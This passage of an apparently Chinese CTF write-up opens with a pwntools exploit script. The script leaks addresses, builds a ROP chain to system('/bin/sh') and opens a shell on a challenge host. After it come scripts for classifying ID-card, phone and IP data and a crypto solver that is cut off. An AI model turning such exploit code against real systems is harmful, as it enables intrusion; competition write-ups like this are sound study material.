class="hljs-string">&#x27;pill?\n&#x27;</span>,<span class="hljs-string">b&#x27;blue&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>p=remote(<span class="hljs-string">&quot;10.1.197.37&quot;</span>,<span class="hljs-number">9999</span>)<br><span class="hljs-comment">#p=process(&#x27;./pwn&#x27;)</span><br>e=ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#pause()</span><br>l(<span class="hljs-number">0x40</span>)<br>d(<span class="hljs-string">&#x27;asdfadsf&#x27;</span>)<br>pill(<span class="hljs-number">1</span>)<br>l(<span class="hljs-number">0x400</span>)<br>d(<span class="hljs-string">b&#x27;\x87&#x27;</span>)<br>pill(<span class="hljs-number">0</span>)<br>l(<span class="hljs-number">0x58</span>)<br>d(<span class="hljs-string">&#x27;asdfasdf&#x27;</span>)<br>p.read(<span class="hljs-number">0x40</span>)<br>d_=u64(p.read(<span class="hljs-number">8</span>))<br>d_=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d_))<br>e.address=d_-<span class="hljs-number">0x1233</span><br>d_=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d_))<br>stack=d_&amp;(-<span class="hljs-number">0x1000</span>)<br>pill(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    l(<span class="hljs-number">0x400</span>)<br>    d(<span class="hljs-string">&#x27;asdfadsf&#x27;</span>)<br>    pill(<span class="hljs-number">1</span>)<br><br>l(-<span class="hljs-number">0x400</span>)<br>pill(<span class="hljs-number">1</span>)<br>l(<span class="hljs-number">0x500</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x3c8</span>+p64(e.address+<span class="hljs-number">0x1050</span>)+p64(stack+<span class="hljs-number">0x5000</span>)<br>d(payload)<br>p.readuntil(<span class="hljs-string">&#x27;pill?\n&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;blue&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0x102</span>):<br>    l(<span class="hljs-number">0x1f0</span>)<br>    d(<span class="hljs-string">&#x27;asd&#x27;</span>)<br>    pill(<span class="hljs-number">1</span>)<br>l(-<span class="hljs-number">0x400</span>)<br>pill(<span class="hljs-number">1</span>)<br>l(<span class="hljs-number">0x500</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x3c8</span>+p64(e.address+<span class="hljs-number">0x11CE</span>)+p64(stack-<span class="hljs-number">0x78</span>)<br>d(payload)<br>p.readuntil(<span class="hljs-string">&#x27;pill?\n&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;blue&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.read(<span class="hljs-number">0x70</span>)<br>d_=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d_))<br>real_stack=d_<br><br>pill(<span class="hljs-number">1</span>)<br>l(-<span class="hljs-number">0x400</span>)<br>pill(<span class="hljs-number">1</span>)<br>l(<span class="hljs-number">0x1f0</span>)<br>d(<span class="hljs-string">&#x27;rotwill&#x27;</span>)<br><br>pill(<span class="hljs-number">1</span>)<br>l(<span class="hljs-number">0x500</span>)<br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x3c8</span>-<span class="hljs-number">33</span>*<span class="hljs-number">0x10</span>)+p64(e.address+<span class="hljs-number">0x11ce</span>)+p64(real_stack-<span class="hljs-number">0x4d0</span>-<span class="hljs-number">8</span>)<br>d(payload)<br>p.readuntil(<span class="hljs-string">&#x27;pill?\n&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;blue&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.read(<span class="hljs-number">0x4d0</span>)<br>d_=u64(p.read(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(d_))<br>pause()<br>pill(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#p.interactive()</span><br><br>libc=ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>libc.address=d_-<span class="hljs-number">0x29d90</span><br><br>gadget=libc.address+<span class="hljs-number">0xebc81</span><br>l(-<span class="hljs-number">0x400</span>)<br>pill(<span class="hljs-number">1</span>)<br>l(<span class="hljs-number">0x500</span>)<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>rdi=<span class="hljs-number">0x000000000002a3e5</span>+libc.address<br>bin_sh=<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))<br>ret=rdi+<span class="hljs-number">1</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp $rebase(0x1228)\nc&#x27;)</span><br><span class="hljs-comment">#pause()</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x3c8</span>)+p64(ret)+p64(ret)+p64(rdi)+p64(bin_sh)+p64(system)+p64(stack+<span class="hljs-number">0x18000</span>)<br>d(payload)<br>p.readuntil(<span class="hljs-string">&#x27;pill?\n&#x27;</span>)<br>p.send(<span class="hljs-string">b&#x27;&#x27;</span>.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h1><h2 id="datasecurity-classify1"><a href="#datasecurity-classify1" class="headerlink" title="datasecurity_classify1"></a>datasecurity_classify1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> string <span class="hljs-keyword">import</span> ascii_letters<br><span class="hljs-keyword">import</span> os<br>phone_prefix = [<br>    <span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>,<br>    <span class="hljs-number">778</span>, <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>, <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>,<br>    <span class="hljs-number">756</span>, <span class="hljs-number">766</span>, <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>, <span class="hljs-number">777</span>,<br>    <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>, <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span><br>]<br>id_card_xishu = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>odd = <span class="hljs-string">&quot;1 0 X 9 8 7 6 5 4 3 2&quot;</span>.split(<span class="hljs-string">&#x27; &#x27;</span>)<br><span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&#x27;result.csv&#x27;</span>):<br>    os.remove(<span class="hljs-string">&#x27;result.csv&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.csv&#x27;</span>,<span class="hljs-string">&#x27;+a&#x27;</span>) <span class="hljs-keyword">as</span> result:<br>    result.write(<span class="hljs-string">&#x27;类型,数据值\n&#x27;</span>);<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.csv&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> data:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data.readlines():<br>            line = line.decode().strip();<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">18</span>:<br>                <span class="hljs-comment"># id card</span><br>                qian_17 = line[:<span class="hljs-number">17</span>]<br>                sums = <span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">for</span> i,e <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(qian_17):<br>                    e = <span class="hljs-built_in">int</span>(e) * id_card_xishu[i];<br>                    sums += e;<br>                <span class="hljs-keyword">if</span> line[-<span class="hljs-number">1</span>] != odd[sums % <span class="hljs-number">11</span>]:<br>                    <span class="hljs-keyword">continue</span>;<br>                result.write(<span class="hljs-string">&#x27;身份证号,&#x27;</span>+line + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>            <span class="hljs-keyword">elif</span> <span class="hljs-built_in">len</span>(line) == <span class="hljs-number">11</span>:<br>                <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> phone_prefix:<br>                    <span class="hljs-keyword">if</span> line.startswith(<span class="hljs-built_in">str</span>(prefix)):<br>                        result.write(<span class="hljs-string">&#x27;手机号,&#x27;</span>+line + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>                        <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;数据值&#x27;</span> <span class="hljs-keyword">in</span> line:<br>                    <span class="hljs-keyword">continue</span>;<br>                <span class="hljs-comment"># name</span><br>                sign = <span class="hljs-literal">False</span>;<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ascii_letters:<br>                    <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> line:<br>                        sign = <span class="hljs-literal">True</span>;<br>                        <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sign:<br>                    result.write(<span class="hljs-string">&#x27;姓名,&#x27;</span>+line + <span class="hljs-string">&#x27;\n&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="datasecurity-classify2"><a href="#datasecurity-classify2" class="headerlink" title="datasecurity_classify2"></a>datasecurity_classify2</h2><p>先用<code>tshark</code>提取数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tshark -r data.pcapng -T felds -Y <span class="hljs-string">&quot;http.request.method==POST&quot;</span> -e data<br></code></pre></td></tr></table></figure><p>除了文档中的要求外注意处理ip的范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">veryifyIdCard</span>(<span class="hljs-params">idcard</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(idcard) != <span class="hljs-number">18</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br>    idcardList.append(idcard)<br>    idcard = idcard.upper()<br>    id_card_xishu = [<span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>]<br>    odd = <span class="hljs-string">&quot;1 0 X 9 8 7 6 5 4 3 2&quot;</span>.split(<span class="hljs-string">&#x27; &#x27;</span>)<br>    sums = <span class="hljs-number">0</span>;<br>    qian_17 = idcard[:<span class="hljs-number">17</span>]<br>    <span class="hljs-keyword">for</span> i,e <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(qian_17):<br>        e = <span class="hljs-built_in">int</span>(e) * id_card_xishu[i];<br>        sums += e;<br><br>    <span class="hljs-keyword">return</span> idcard[-<span class="hljs-number">1</span>] == odd[sums % <span class="hljs-number">11</span>];<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verifyPhone</span>(<span class="hljs-params">phone</span>):<br>    phone_prefix = [<br>        <span class="hljs-number">734</span>, <span class="hljs-number">735</span>, <span class="hljs-number">736</span>, <span class="hljs-number">737</span>, <span class="hljs-number">738</span>, <span class="hljs-number">739</span>, <span class="hljs-number">747</span>, <span class="hljs-number">748</span>, <span class="hljs-number">750</span>, <span class="hljs-number">751</span>, <span class="hljs-number">752</span>, <span class="hljs-number">757</span>, <span class="hljs-number">758</span>, <span class="hljs-number">759</span>, <span class="hljs-number">772</span>, <span class="hljs-number">778</span>,<br>        <span class="hljs-number">782</span>, <span class="hljs-number">783</span>, <span class="hljs-number">784</span>, <span class="hljs-number">787</span>, <span class="hljs-number">788</span>, <span class="hljs-number">795</span>, <span class="hljs-number">798</span>, <span class="hljs-number">730</span>, <span class="hljs-number">731</span>, <span class="hljs-number">732</span>, <span class="hljs-number">740</span>, <span class="hljs-number">745</span>, <span class="hljs-number">746</span>, <span class="hljs-number">755</span>, <span class="hljs-number">756</span>, <span class="hljs-number">766</span>,<br>        <span class="hljs-number">767</span>, <span class="hljs-number">771</span>, <span class="hljs-number">775</span>, <span class="hljs-number">776</span>, <span class="hljs-number">785</span>, <span class="hljs-number">786</span>, <span class="hljs-number">796</span>, <span class="hljs-number">733</span>, <span class="hljs-number">749</span>, <span class="hljs-number">753</span>, <span class="hljs-number">773</span>, <span class="hljs-number">774</span>, <span class="hljs-number">777</span>, <span class="hljs-number">780</span>, <span class="hljs-number">781</span>, <span class="hljs-number">789</span>,<br>        <span class="hljs-number">790</span>, <span class="hljs-number">791</span>, <span class="hljs-number">793</span>, <span class="hljs-number">799</span><br>    ]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(phone) != <span class="hljs-number">11</span> <span class="hljs-keyword">or</span> phone[-<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;X&#x27;</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br>    <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> phone_prefix:<br>        <span class="hljs-keyword">if</span> phone.startswith(<span class="hljs-built_in">str</span>(prefix)):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verifyIp</span>(<span class="hljs-params">ip</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip.split(<span class="hljs-string">&#x27;.&#x27;</span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(i) &gt; <span class="hljs-number">255</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cleanData</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;-&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        data = <span class="hljs-string">&#x27;&#x27;</span>.join(data.split(<span class="hljs-string">&#x27;-&#x27;</span>))<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27; &#x27;</span> <span class="hljs-keyword">in</span> data:<br>        data = <span class="hljs-string">&#x27;&#x27;</span>.join(data.split(<span class="hljs-string">&#x27; &#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> data;<br><br><br><br><span class="hljs-keyword">import</span> re,os<br>ipMatch = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;&#x27;</span>);<br>phoneMatch = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;11&#125;|\d&#123;3&#125;\ \d&#123;4&#125;\ \d&#123;4&#125;|\d&#123;3&#125;\-\d&#123;4&#125;\-\d&#123;4&#125;)&#x27;</span>);<br>idcardMatch = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;18&#125;|\d&#123;6&#125;\ \d&#123;8&#125;\ \d&#123;4&#125;|\d&#123;6&#125;\-\d&#123;8&#125;\-\d&#123;4&#125;)&#x27;</span>);<br>idcardMatch_with_x = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;17&#125;X|\d&#123;6&#125;\ \d&#123;8&#125;\ \d&#123;3&#125;X|\d&#123;6&#125;\-\d&#123;8&#125;\-\d&#123;3&#125;X)&#x27;</span>);<br><br>idcardList = []<br><br><span class="hljs-keyword">if</span> os.path.exists(<span class="hljs-string">&#x27;result2.csv&#x27;</span>):<br>    os.remove(<span class="hljs-string">&#x27;result2.csv&#x27;</span>)<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result2.csv&#x27;</span>,<span class="hljs-string">&#x27;+a&#x27;</span>) <span class="hljs-keyword">as</span> result:<br>    result.write(<span class="hljs-string">&#x27;category,value\n&#x27;</span>);<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;data.dat&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> data:<br>        data2 = <span class="hljs-built_in">bytes</span>.fromhex(data.read()).decode();<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> data2.split(<span class="hljs-string">&#x27;,&#x27;</span>):<br>            <span class="hljs-keyword">if</span> idcardMatch.findall(line):<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> idcardMatch.findall(line):<br>                    e = cleanData(e);<br>                    <span class="hljs-keyword">if</span> veryifyIdCard(e):<br>                        result.write(<span class="hljs-string">&#x27;idcard,&#x27;</span> + e + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>            <span class="hljs-keyword">if</span> idcardMatch_with_x.findall(line):<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> idcardMatch_with_x.findall(line):<br>                    e = cleanData(e);<br>                    <span class="hljs-keyword">if</span> veryifyIdCard(e):<br>                        result.write(<span class="hljs-string">&#x27;idcard,&#x27;</span> + e + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>            <span class="hljs-keyword">if</span> phoneMatch.findall(line):<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> phoneMatch.findall(line):<br>                    e = cleanData(e);<br>                    sign = <span class="hljs-literal">True</span>;<br>                    <span class="hljs-keyword">for</span> card <span class="hljs-keyword">in</span> idcardList:<br>                        <span class="hljs-keyword">if</span> e <span class="hljs-keyword">in</span> card:<br>                            sign = <span class="hljs-literal">False</span>;<br>                            <span class="hljs-keyword">break</span>;<br>                    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> sign:<br>                        <span class="hljs-keyword">continue</span>;<br>                    <span class="hljs-keyword">if</span> verifyPhone(e):<br>                        result.write(<span class="hljs-string">&#x27;phone,&#x27;</span> + e + <span class="hljs-string">&#x27;\n&#x27;</span>);<br>            <span class="hljs-keyword">if</span> ipMatch.findall(line):<br>                <span class="hljs-keyword">for</span> e <span class="hljs-keyword">in</span> ipMatch.findall(line):<br>                    <span class="hljs-keyword">if</span> verifyIp(e):<br>                        result.write(<span class="hljs-string">&#x27;ip,&#x27;</span> + e + <span class="hljs-string">&#x27;\n&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="/img/wp/2024/2024-zjss-js-datasecurity_classify2-1.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="MyCode"><a href="#MyCode" class="headerlink" title="MyCode"></a>MyCode</h2><p>根据加密内容生成key并爆破即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">substitute</span>(<span class="hljs-params">state, sub_box</span>):<br>    <span class="hljs-keyword">return</span> [sub_box[b &amp; <span class="hljs-number">0xF</span>] | (sub_box[(b &gt;&gt; <span class="hljs-number">4</span>) &amp; <span class="hljs-number">0xF</span>] &lt;&lt; <span class="hljs-number">4</span>) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> state]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_round_keys</span>(<span class="hljs-params">base_key, rounds</span>):<br>    round_keys = []<br>    temp_key = base_key<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        round_keys.append(temp_key &amp; <span class="hljs-number">0xFFFFFFFF</span>)<br>        temp_key ^= ((temp_key &lt;&lt; <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span>) | ((temp_key &gt;&gt; <span class="hljs-number">31</span>) &amp; <span class="hljs-number">0x1</span>)<br>    <span class="hljs-keyword">return</span> round_keys<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_state</span>(<span class="hljs-params">base_key, state, rounds, encrypt</span>):<br>    sub_box = [<span class="hljs-number">0x9</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xA</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0xE</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x7</span>]<br>    inv_sub_box = [<span class="hljs-number">0xA</span>, <span class="hljs-number">0x5</span>, <span class="hljs-number">0x9</span>, <span class="hljs-number">0xB</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x7</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0xF</span>, <span class="hljs-number">0x6</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x2</span>, <span class="hljs-number">0x3</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0x4</span>, <span class="hljs-number">0xD</span>, <span class="hljs-number">0xE</span>]<br><br>    round_keys = generate_round_keys(base_key, rounds)<br><br>    <span class="hljs-keyword">if</span> encrypt:<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>            state = substitute(state, sub_box)<br>            state = [s ^ ((round_keys[<span class="hljs-built_in">round</span>] &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(state)]<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> <span class="hljs-built_in">round</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>            state = [s ^ ((round_keys[<span class="hljs-built_in">round</span>] &gt;&gt; (i * <span class="hljs-number">8</span>)) &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> i, s <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(state)]<br>            state = substitute(state, inv_sub_box)<br><br>    <span class="hljs-keyword">return</span> state<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">plaintext, key, rounds=<span 